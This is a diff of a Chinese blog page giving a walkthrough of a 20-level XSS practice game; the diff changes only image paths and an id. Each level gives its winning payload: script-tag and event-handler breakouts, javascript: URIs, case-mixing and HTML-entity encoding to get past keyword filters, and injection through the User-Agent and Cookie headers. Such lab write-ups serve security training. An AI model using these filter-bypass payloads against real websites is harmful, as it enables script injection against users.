@@ -72,56 +72,56 @@
       
 
       
-      <h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><img src="1.png" alt=""></p>
+      <h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><img src="/.com//1.png" alt></p>
 <pre><code>url/xss/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><hr>
-<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="2.png" alt=""></p>
+<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="/.com//2.png" alt></p>
 <pre><code>1&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;&quot;</code></pre><hr>
-<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="3.png" alt=""></p>
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="/.com//3.png" alt></p>
 <pre><code>1&#39; onmouseover=&#39;alert(1)</code></pre><hr>
-<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="4.png" alt=""></p>
+<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="/.com//4.png" alt></p>
 <pre><code>1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
 <a id="more"></a>
-<h4 id="第五关（把on的替换成o-n）"><a href="#第五关（把on的替换成o-n）" class="headerlink" title="第五关（把on的替换成o_n）"></a>第五关（把on的替换成o_n）</h4><p><img src="5-1.png" alt=""></p>
-<pre><code>1&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;2&lt;/a&gt;</code></pre><p>插入后点击“<u>2</u>”链接<br><img src="5-2.png" alt=""></p>
+<h4 id="第五关（把on的替换成o-n）"><a href="#第五关（把on的替换成o-n）" class="headerlink" title="第五关（把on的替换成o_n）"></a>第五关（把on的替换成o_n）</h4><p><img src="/.com//5-1.png" alt></p>
+<pre><code>1&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;2&lt;/a&gt;</code></pre><p>插入后点击“<u>2</u>”链接<br><img src="/.com//5-2.png" alt></p>
 <hr>
-<h4 id="第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）"><a href="#第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）" class="headerlink" title="第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）"></a>第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）</h4><p><img src="6.png" alt=""><br>大小写绕过：</p>
+<h4 id="第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）"><a href="#第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）" class="headerlink" title="第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）"></a>第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）</h4><p><img src="/.com//6.png" alt><br>大小写绕过：</p>
 <pre><code>1&quot;&gt; &lt;SCript&gt;alert(1)&lt;/scripT&gt;</code></pre><hr>
-<h4 id="第七关（把on替换成空）"><a href="#第七关（把on替换成空）" class="headerlink" title="第七关（把on替换成空）"></a>第七关（把on替换成空）</h4><p><img src="7.png" alt=""></p>
+<h4 id="第七关（把on替换成空）"><a href="#第七关（把on替换成空）" class="headerlink" title="第七关（把on替换成空）"></a>第七关（把on替换成空）</h4><p><img src="/.com//7.png" alt></p>
 <pre><code>1&quot; oonnmouseover=&quot;alert(1)</code></pre><hr>
-<h4 id="第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）"><a href="#第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）" class="headerlink" title="第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）"></a>第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）</h4><p>利用burp suite转HTML编码，填入框中后添加友情链接，再点击友情链接。<br><img src="8-1.png" alt=""><br><img src="8-2.png" alt=""></p>
+<h4 id="第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）"><a href="#第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）" class="headerlink" title="第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）"></a>第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）</h4><p>利用burp suite转HTML编码，填入框中后添加友情链接，再点击友情链接。<br><img src="/.com//8-1.png" alt><br><img src="/.com//8-2.png" alt></p>
 <pre><code>javascript:alert(1)
 &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; </code></pre><hr>
-<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>利用burp suite转HTML编码和http://格式的url，填入框中后添加友情链接，再点击友情链接。<br><img src="9-1.png" alt=""><br><img src="9-2.png" alt=""></p>
+<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>利用burp suite转HTML编码和http://格式的url，填入框中后添加友情链接，再点击友情链接。<br><img src="/.com//9-1.png" alt><br><img src="/.com//9-2.png" alt></p>
 <pre><code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;/*http://a.php*/</code></pre><hr>
-<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><img src="10-1.png" alt=""><br><img src="10-2.png" alt=""></p>
+<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><img src="/.com//10-1.png" alt><br><img src="/.com//10-2.png" alt></p>
 <pre><code>1&quot; onclick=&quot;alert(1)</code></pre><hr>
-<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><h6 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p><img src="11-1.png" alt=""><br><img src="11-2.png" alt=""></p>
+<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><h6 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p><img src="/.com//11-1.png" alt><br><img src="/.com//11-2.png" alt></p>
 <pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
-<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><h6 id="第一种方法：跟第十一关的第一种方法一样。"><a href="#第一种方法：跟第十一关的第一种方法一样。" class="headerlink" title="第一种方法：跟第十一关的第一种方法一样。"></a>第一种方法：跟第十一关的第一种方法一样。</h6><h6 id="第二种方法：-1"><a href="#第二种方法：-1" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p>由于t_ua反馈的是user-Agent的值，所以使用burp suite修改user-Agent的值后，再将t_ua的type值改为display后将鼠标移入框内，弹框。<br><img src="12-1.png" alt=""><br><img src="12-2.png" alt=""></p>
+<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><h6 id="第一种方法：跟第十一关的第一种方法一样。"><a href="#第一种方法：跟第十一关的第一种方法一样。" class="headerlink" title="第一种方法：跟第十一关的第一种方法一样。"></a>第一种方法：跟第十一关的第一种方法一样。</h6><h6 id="第二种方法：-1"><a href="#第二种方法：-1" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p>由于t_ua反馈的是user-Agent的值，所以使用burp suite修改user-Agent的值后，再将t_ua的type值改为display后将鼠标移入框内，弹框。<br><img src="/.com//12-1.png" alt><br><img src="/.com//12-2.png" alt></p>
 <pre><code>User-Agent: user=1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
-<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><h6 id="第一种方法：跟第十一关的第一种方法一样。-1"><a href="#第一种方法：跟第十一关的第一种方法一样。-1" class="headerlink" title="第一种方法：跟第十一关的第一种方法一样。"></a>第一种方法：跟第十一关的第一种方法一样。</h6><h6 id="第二种方法：-2"><a href="#第二种方法：-2" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p>由于t_cook反馈的是cookie的值，所以使用burp suite修改cookie的值后，再将t_ua的type值改为display后将鼠标移入框内，弹框。<br><img src="13-1.png" alt=""><br><img src="13-2.png" alt=""></p>
+<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><h6 id="第一种方法：跟第十一关的第一种方法一样。-1"><a href="#第一种方法：跟第十一关的第一种方法一样。-1" class="headerlink" title="第一种方法：跟第十一关的第一种方法一样。"></a>第一种方法：跟第十一关的第一种方法一样。</h6><h6 id="第二种方法：-2"><a href="#第二种方法：-2" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p>由于t_cook反馈的是cookie的值，所以使用burp suite修改cookie的值后，再将t_ua的type值改为display后将鼠标移入框内，弹框。<br><img src="/.com//13-1.png" alt><br><img src="/.com//13-2.png" alt></p>
 <pre><code>Cookie: user=1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
-<h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h4><h6 id="第一种方法：-1"><a href="#第一种方法：-1" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将iframe的src值改为：<br><img src="14.png" alt=""></p>
+<h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h4><h6 id="第一种方法：-1"><a href="#第一种方法：-1" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将iframe的src值改为：<br><img src="/.com//14.png" alt></p>
 <pre><code>javascript:alert(1)</code></pre><h6 id="第二种方法：-3"><a href="#第二种方法：-3" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
-<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h4><h6 id="第一种方法：-2"><a href="#第一种方法：-2" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将img标签添加onmouseover事件：<br><img src="15-1.png" alt=""></p>
-<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-4"><a href="#第二种方法：-4" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p><img src="15-2.png" alt=""></p>
+<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h4><h6 id="第一种方法：-2"><a href="#第一种方法：-2" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将img标签添加onmouseover事件：<br><img src="/.com//15-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-4"><a href="#第二种方法：-4" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p><img src="/.com//15-2.png" alt></p>
 <pre><code>&quot;level3.php?keyword=1&#39; onmouseover=&#39;alert(1)&quot;</code></pre><hr>
-<h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h4><h6 id="第一种方法：-3"><a href="#第一种方法：-3" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将img标签添加onmouseover事件：<br><img src="16-1.png" alt=""></p>
+<h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h4><h6 id="第一种方法：-3"><a href="#第一种方法：-3" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将img标签添加onmouseover事件：<br><img src="/.com//16-1.png" alt></p>
 <pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-5"><a href="#第二种方法：-5" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
-<h4 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h4><h6 id="第一种方法：-4"><a href="#第一种方法：-4" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="17-1.png" alt=""></p>
+<h4 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h4><h6 id="第一种方法：-4"><a href="#第一种方法：-4" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/.com//17-1.png" alt></p>
 <pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-6"><a href="#第二种方法：-6" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
-<h4 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h4><h6 id="第一种方法：-5"><a href="#第一种方法：-5" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="18-1.png" alt=""></p>
+<h4 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h4><h6 id="第一种方法：-5"><a href="#第一种方法：-5" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/.com//18-1.png" alt></p>
 <pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-7"><a href="#第二种方法：-7" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
-<h4 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h4><h6 id="第一种方法：-6"><a href="#第一种方法：-6" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="19-1.png" alt=""></p>
+<h4 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h4><h6 id="第一种方法：-6"><a href="#第一种方法：-6" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/.com//19-1.png" alt></p>
 <pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-8"><a href="#第二种方法：-8" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
-<h4 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h4><h6 id="第一种方法：-7"><a href="#第一种方法：-7" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="20-1.png" alt=""></p>
+<h4 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h4><h6 id="第一种方法：-7"><a href="#第一种方法：-7" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/.com//20-1.png" alt></p>
 <pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-9"><a href="#第二种方法：-9" class="headerlink" title="第二种方法："></a>第二种方法：</h6>
       
       <!-- 打赏 -->
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" data-id="ck4jwbl3q00019swr9w4wfhh8"
+      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" data-id="ck4jx79zk000120wr5hnxh6lp"
         class="article-share-link">Share</a>
       
     </footer>
